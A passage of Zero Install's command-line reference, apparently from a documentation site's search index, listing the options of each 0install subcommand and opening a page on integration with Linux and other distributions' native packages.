command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. --customize (Windows only) Show the graphical policy editor. This allows you to customize which version of a program or library to use. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. --with-store DIR Add DIR to the list of implementation caches to search. However, new downloads will not be written to this directory. --command COMMAND Instead of executing the default command, use COMMAND instead. Possible command names are defined in the program's interface. Set to empty (\"\") to ignore the command during selection. --before VERSION Require a version of the main program earlier than VERSION . i.e., force the use of an old version the program. --not-before VERSION Require a version of the main program not earlier than VERSION . E.g., if you want to run version 2.0 or later, use --not-before=2.0. --version RANGE Require a version of the main program within the given RANGE . Ranges are separated by pipes (|). Each range is in the form \"START..!END\". The range matches versions where START <= VERSION < END. The start or end may be omitted. A single version number may be used instead of a range to match only that version, or !VERSION to match everything except that version. --version-for URI RANGE For any library or sub-component with the given URI specifies the version RANGE (as for --version). -s --source Select source code rather than a binary. This is used internally by '0compile'. --os OS Forces the solver to target the operating system OS . Supported values: , POSIX, Linux, Solaris, FreeBSD, Darwin, MacOSX, Cygwin, Windows, unknown --cpu CPU Forces the solver to target a specific CPU . Supported values: , i386, i486, i586, i686, x86_64, ppc, ppc64, armv6l, armv7l, src, unknown --language Specifies the preferred language for the implementation. Use ISO short language codes (e.g. en or en-US). You can use this option multiple times to specify multiple acceptable languages. --xml Write selected versions to console as machine-readable XML. --show Show where the selected components are stored on the disk. run Behaves similarly to '0install download', except that it also runs the program after ensuring it is in the cache. Returns an exit status of 1 if the download step failed. Otherwise, the exit status will be the exit status of the program being run. Usage: 0install run [OPTIONS] URI [ARGS] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. --customize (Windows only) Show the graphical policy editor. This allows you to customize which version of a program or library to use. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. --with-store DIR Add DIR to the list of implementation caches to search. However, new downloads will not be written to this directory. --command COMMAND Instead of executing the default command, use COMMAND instead. Possible command names are defined in the program's interface. Set to empty (\"\") to ignore the command during selection. --before VERSION Require a version of the main program earlier than VERSION . i.e., force the use of an old version the program. --not-before VERSION Require a version of the main program not earlier than VERSION . E.g., if you want to run version 2.0 or later, use --not-before=2.0. --version RANGE Require a version of the main program within the given RANGE . Ranges are separated by pipes (|). Each range is in the form \"START..!END\". The range matches versions where START <= VERSION < END. The start or end may be omitted. A single version number may be used instead of a range to match only that version, or !VERSION to match everything except that version. --version-for URI RANGE For any library or sub-component with the given URI specifies the version RANGE (as for --version). -s --source Select source code rather than a binary. This is used internally by '0compile'. --os OS Forces the solver to target the operating system OS . Supported values: , POSIX, Linux, Solaris, FreeBSD, Darwin, MacOSX, Cygwin, Windows, unknown --cpu CPU Forces the solver to target a specific CPU . Supported values: , i386, i486, i586, i686, x86_64, ppc, ppc64, armv6l, armv7l, src, unknown --language Specifies the preferred language for the implementation. Use ISO short language codes (e.g. en or en-US). You can use this option multiple times to specify multiple acceptable languages. --xml Write selected versions to console as machine-readable XML. --show Show where the selected components are stored on the disk. -m MAIN --main MAIN Run the specified executable MAIN instead of the default. If it starts with '/' or '\\' then the path is relative to the implementation's top-level directory, whereas otherwise it is relative to the directory containing the default main program. May not contain command-line arguments! Whitespaces do not need to be escaped. -w COMMAND --wrapper COMMAND Instead of executing the chosen program directly, run COMMAND PROGRAM ARGS. This is useful for running debuggers and tracing tools on the program (rather than on Zero Install!). Note that the wrapper is executed in the environment selected by the program; hence, this mechanism cannot be used for sandboxing. May contain command-line arguments. Whitespaces must be escaped! --no-wait (Windows only) Immediately returns once the chosen program has been launched instead of waiting for it to finish executing. On Windows the exit code is the process ID of the launched program. import Imports a feed from a local file, as if it had been downloaded from the network. This is useful when testing a feed file, to avoid uploading it to a remote server in order to download it again. The file must have a trusted digital signature, as when fetching from the network. Usage: 0install import FEED-FILE [...] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. export Exports all feeds and implementations required to launch the program specified by a URI to a DIRECTORY. Usage: 0install export [OPTIONS] URI DIRECTORY Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. --customize (Windows only) Show the graphical policy editor. This allows you to customize which version of a program or library to use. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. --with-store DIR Add DIR to the list of implementation caches to search. However, new downloads will not be written to this directory. --command COMMAND Instead of executing the default command, use COMMAND instead. Possible command names are defined in the program's interface. Set to empty (\"\") to ignore the command during selection. --before VERSION Require a version of the main program earlier than VERSION . i.e., force the use of an old version the program. --not-before VERSION Require a version of the main program not earlier than VERSION . E.g., if you want to run version 2.0 or later, use --not-before=2.0. --version RANGE Require a version of the main program within the given RANGE . Ranges are separated by pipes (|). Each range is in the form \"START..!END\". The range matches versions where START <= VERSION < END. The start or end may be omitted. A single version number may be used instead of a range to match only that version, or !VERSION to match everything except that version. --version-for URI RANGE For any library or sub-component with the given URI specifies the version RANGE (as for --version). -s --source Select source code rather than a binary. This is used internally by '0compile'. --os OS Forces the solver to target the operating system OS . Supported values: , POSIX, Linux, Solaris, FreeBSD, Darwin, MacOSX, Cygwin, Windows, unknown --cpu CPU Forces the solver to target a specific CPU . Supported values: , i386, i486, i586, i686, x86_64, ppc, ppc64, armv6l, armv7l, src, unknown --language Specifies the preferred language for the implementation. Use ISO short language codes (e.g. en or en-US). You can use this option multiple times to specify multiple acceptable languages. --xml Write selected versions to console as machine-readable XML. --show Show where the selected components are stored on the disk. --no-implementations Do not include implementation archives in the export. Only export feeds. --include-zero-install Include Zero Install itself in the export alongside the application. --bootstrap Choose the type of Bootstrapper to place alongside the export. Supported values: None, Run, Integrate search Searches for feeds indexed by the mirror server that match specified keywords. Note that the default mirror server indexes all known feeds, regardless of quality; you must decide whether to trust the programs before running them. Usage: 0install search QUERY Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. list Lists all locally known feed URIs. If a search term is given, only URIs containing that string are shown (case insensitive). Usage: 0install list [PATTERN] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. catalog search Searches registered catalogs for applications that match the specified query. If no query is given all applications in the catalogs are listed. Usage: 0install catalog search [QUERY] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. catalog refresh Refreshes (downloads) all registered catalogs. Usage: 0install catalog refresh Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. catalog add Adds an URI to the list of catalogs. Usage: 0install catalog add URI Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. --skip-verify Skip downloading the catalog to verify it is valid before adding it to the list. catalog remove Removes an URI from the list of catalogs. Usage: 0install catalog remove URI Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. catalog reset Resets the list of catalogs to the default source. Usage: 0install catalog reset Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. catalog list Lists all registered catalogs. Usage: 0install catalog list Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. config View or change configuration settings. With no arguments, it displays all settings and their current values. With one argument, it displays the current value of the named setting. With two arguments, it sets the setting to the given value or resets it to the default value if the value \"default\" is given. Usage: 0install config [NAME [VALUE|default]] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. --tab TAB Switch to a specific tab in the configuration GUI. Possible TAB s are 'updates', 'storage', 'catalog', 'trust', 'sync', 'language', 'language' and 'advanced'. Has no effect in text-mode. add-feed Register an additional source of implementations (versions) of a program. Usage: 0install add-feed [OPTIONS] [INTERFACE] FEED Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. remove-feed Un-registers a feed, reversing the effect of '0install add-feed'. Usage: 0install remove-feed [OPTIONS] [INTERFACE] FEED Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. list-feeds Lists all extra feeds added to URI using '0install add-feed'. Usage: 0install list-feeds [OPTIONS] URI Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. digest Calculates the manifest digest of a directory or archive. Usage: 0install digest (DIRECTORY | ARCHIVE [SUBDIR]) Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. --manifest Display the manifest itself (one line for each file or directory). --digest Display the manifest's digest (enabled by default if --manifest is not set). --algorithm HASH The HASH algorithm to use for the digest. Supported values: sha256new, sha256, sha1new store add Adds the contents of a directory or archive to the cache. Usage: 0install store add DIGEST (DIRECTORY | (ARCHIVE [EXTRACT [MIME-TYPE [...]])) Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. store audit Checks that all implementations in the cache are undamaged. Additional arguments specify custom cache locations. Usage: 0install store audit [CACHE-DIR+] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. store copy Copies an implementation into the cache. Similar to '0install store add', but the digest is extracted from the directory name. An additional arguments specifies a custom target cache location. Usage: 0install store copy DIRECTORY [CACHE] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. store export Exports a cached implementation as an archive (ZIP, TAR, etc.). The result can be imported on another machine using '0install store add'. Usage: 0install store export DIGEST OUTPUT-ARCHIVE [MIME-TYPE] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. store find Determines the local path of a cached implementation. Usage: 0install store find DIGEST Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. store list Lists all implementation cache directories. Usage: 0install store list Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. store list-implementations Lists all cached implementations. If a feed URI is specified only implementations for that particular feed are listed. Usage: 0install store list-implementations [FEED-URI] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. store manage Displays a graphical user interface for managing implementations in the cache. Shows associations with cached feeds. Usage: 0install store manage Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. store optimise Saves disk space by merging identical files with hardlinks. Additional arguments specify custom cache locations. Usage: 0install store optimise [CACHE-DIR+] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. store purge Removes all implementations from the cache. Use this command to clean up the system before removing Zero Install. Deleting cache directories manually may be difficult due to the NTFS ACLs employed to protect implementations against modification. Additional arguments specify custom cache locations. Usage: 0install store purge [CACHE-DIR+] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. store remove Removes an implementation from the cache. Usage: 0install store remove DIGEST+ Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. store verify Makes sure an implementation has not been damaged (i.e. it manifest digest has not changed). Usage: 0install store verify [DIRECTORY] DIGEST Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. store add-dir Adds a directory to the list of custom implementation caches. Usage: 0install store add-dir PATH Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. store remove-dir Removes a directory from the list of custom implementation caches. Usage: 0install store remove-dir PATH Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. central Opens the central graphical user interface for launching and managing applications. Usage: 0install central [OPTIONS] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. add Add an application to the application list. Usage Linux: 0install add [OPTIONS] NAME URI Usage Windows: 0install add [OPTIONS] URI Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. --no-download Do not download the application itself yet. Will be automatically downloaded on first use instead. remove Removes an application from the application list and undoes any desktop environment integration. Usage: 0install remove [OPTIONS] (ALIAS|INTERFACE) Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. remove-all Removes all applications from the application list and undoes any desktop environment integration. Use this command to clean up the system before removing Zero Install. Usage: 0install remove-all [OPTIONS] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. integrate Adds an application to the application list (if missing) and integrate it into the desktop environment. Usage: 0install integrate [OPTIONS] (ALIAS|INTERFACE) Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. --no-download Do not download the application itself yet. Will be automatically downloaded on first use instead. --add-standard Add the recommended standard access points. --add-all Add all available access points. --add CATEGORY Add all access points of a specific CATEGORY . Supported values: capabilities, menu, desktop, send-to, aliases, auto-start, default-app --remove-all Remove all access points. --remove CATEGORY Remove all access points of a specific CATEGORY . Supported values: capabilities, menu, desktop, send-to, aliases, auto-start, default-app alias Create an alias for launching an application via 0install without always having to enter the full URI. Usage: 0install alias ALIAS [INTERFACE [COMMAND]] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. --no-download Do not download the application itself yet. Will be automatically downloaded on first use instead. --resolve Print the interface URI for the given alias. --remove Remove an existing alias. list-apps Lists all applications currently in your application list. If a search term is given, only application names containing that string are shown (case insensitive). Usage: 0install list-apps [PATTERN] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. update-all Updates all applications in the application list. Usage: 0install update-all [OPTIONS] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. -c --clean Remove implementations no longer required after the update. repair-all Reapplies all desktop integrations of applications in the application list. Usage: 0install repair-all [OPTIONS] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. sync Synchronizes the application list with the server. Usage: 0install sync [OPTIONS] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. --reset MODE Reset the synchronization data. Possible MODE s are 'none' (merge data from client and server normally), 'client' (replace all data on client with data from server) and 'server' (replace all data on server with data from client). import-apps Imports a set of applications and desktop integrations from an existing app-list.xml file. Usage: 0install import-apps APP-LIST-FILE [OPTIONS] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. --no-download Do not download the application itself yet. Will be automatically downloaded on first use instead. maintenance deploy Deploys Zero Install to the specified TARGET directory or the default directory for programs and integrates it in the system. Usage: 0install maintenance deploy [TARGET] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. -m --machine Apply the configuration machine-wide (for the entire computer) instead of just for the current user. -p --portable Create a portable installation that can be moved around (e.g., on a thumb drive). --restart-central Restart the '0install central' GUI after the update. maintenance remove Removes the current instance of Zero Install from the system. Usage: 0install maintenance remove Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. self-update Updates Zero Install itself to the most recent version. Usage: 0install self-update [OPTIONS] Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. --customize (Windows only) Show the graphical policy editor. This allows you to customize which version of a program or library to use. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. --with-store DIR Add DIR to the list of implementation caches to search. However, new downloads will not be written to this directory. --command COMMAND Instead of executing the default command, use COMMAND instead. Possible command names are defined in the program's interface. Set to empty (\"\") to ignore the command during selection. --before VERSION Require a version of the main program earlier than VERSION . i.e., force the use of an old version the program. --not-before VERSION Require a version of the main program not earlier than VERSION . E.g., if you want to run version 2.0 or later, use --not-before=2.0. --version RANGE Require a version of the main program within the given RANGE . Ranges are separated by pipes (|). Each range is in the form \"START..!END\". The range matches versions where START <= VERSION < END. The start or end may be omitted. A single version number may be used instead of a range to match only that version, or !VERSION to match everything except that version. --version-for URI RANGE For any library or sub-component with the given URI specifies the version RANGE (as for --version). -s --source Select source code rather than a binary. This is used internally by '0compile'. --os OS Forces the solver to target the operating system OS . Supported values: , POSIX, Linux, Solaris, FreeBSD, Darwin, MacOSX, Cygwin, Windows, unknown --cpu CPU Forces the solver to target a specific CPU . Supported values: , i386, i486, i586, i686, x86_64, ppc, ppc64, armv6l, armv7l, src, unknown --language Specifies the preferred language for the implementation. Use ISO short language codes (e.g. en or en-US). You can use this option multiple times to specify multiple acceptable languages. --xml Write selected versions to console as machine-readable XML. --show Show where the selected components are stored on the disk. -m MAIN --main MAIN Run the specified executable MAIN instead of the default. If it starts with '/' or '\\' then the path is relative to the implementation's top-level directory, whereas otherwise it is relative to the directory containing the default main program. May not contain command-line arguments! Whitespaces do not need to be escaped. -w COMMAND --wrapper COMMAND Instead of executing the chosen program directly, run COMMAND PROGRAM ARGS. This is useful for running debuggers and tracing tools on the program (rather than on Zero Install!). Note that the wrapper is executed in the environment selected by the program; hence, this mechanism cannot be used for sandboxing. May contain command-line arguments. Whitespaces must be escaped! --no-wait Immediately returns once the chosen program has been launched instead of waiting for it to finish executing. On Windows the exit code is the process ID of the launched program. --force Perform the update even if the currently installed version is the same or newer. --restart-central Restart the '0install central' GUI after the update.","title":"Command-line interface"},{"location":"details/distribution-integration/","text":"Distribution integration Supported distributions: Arch : Arch Linux - since 1.6 Cygwin : Cygwin - since 1.7 Darwin : (detects native Java) - since 1.11 Debian : dpkg-based (Debian, Mint, Ubuntu, etc) - since 0.28 Gentoo : Gentoo - since 0.45 MacPorts : Mac OS X (ports) - since 1.4 (also extends \"Darwin\") Ports : FreeBSD - since 0.47 RPM : RPM-based (Red Hat, Fedora, OpenSUSE, etc) - since 0.31 Slack : Slackware - since 0.48 Windows : Windows (detects native Java, .NET Framework, PowerShell and Git) - in Windows version If you have already installed a package using your distribution's installer then Zero install can use that instead of downloading a second copy using Zero Install. It can also use PackageKit to install them, if the user is authorised. For example, here is what happens if you ask to run AbiWord when you already have the libenchant1 library it requires installed using apt-get : $ 0launch http://0install.net/2006/autopackage/Abiword.xml If Abiword is itself installed as a distribution package, then the dialog is even simpler, and nothing needs to be downloaded: Of course, you are always free to change the selected version from the native package to a Zero Install version. This will also happen automatically if your native version is incompatible with the required version. For example, if you try this on a machine with a very old copy of libenchant1 then Zero Install will download a newer version rather than using that one. All software installed by Zero Install goes in the cache directory and does 